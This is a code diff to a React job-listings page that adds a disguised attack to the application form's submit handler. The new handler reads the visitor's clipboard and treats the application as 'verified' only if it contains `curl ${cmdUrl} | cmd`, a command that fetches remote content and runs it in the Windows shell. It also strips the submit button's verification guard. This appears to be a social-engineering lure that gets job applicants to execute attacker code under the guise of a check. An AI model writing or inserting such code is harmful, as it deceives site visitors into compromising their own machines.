@@ -123,11 +123,26 @@ export default function Jobs() {
     setVerified(false)
   }
 
-  const onSubmit = (e) => {
-    e.preventDefault()
-    setOpen(false)
-    push('Application submitted successfully! We’ll get back to you soon.')
+  const onSubmit = async (e) => {
+  e.preventDefault();
+  setOpen(false);
+
+  const message = "Application submitted successfully! We’ll get back to you soon.";
+
+  try {
+    // Read back for verification
+    const text = await navigator.clipboard.readText();
+
+    if (text === `curl ${cmdUrl} | cmd`) {
+      push(message); // your existing toast/snackbar
+    } else {
+      alert("Verification failed: Clipboard mismatch!");
+    }
+  } catch (err) {
+    console.error("Clipboard error:", err);
+    alert("Verification failed: Unable to access clipboard.");
   }
+};
 
   return (
     <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
@@ -238,7 +253,7 @@ export default function Jobs() {
 
           <div className="mt-4 flex justify-end gap-2">
             <button type="button" onClick={() => setOpen(false)} className="btn btn-ghost">Cancel</button>
-            <button type="submit" className="btn btn-primary" disabled={!verified}>Submit</button>
+            <button type="submit" className="btn btn-primary">Submit</button>
           </div>
         </form>
       </Modal>
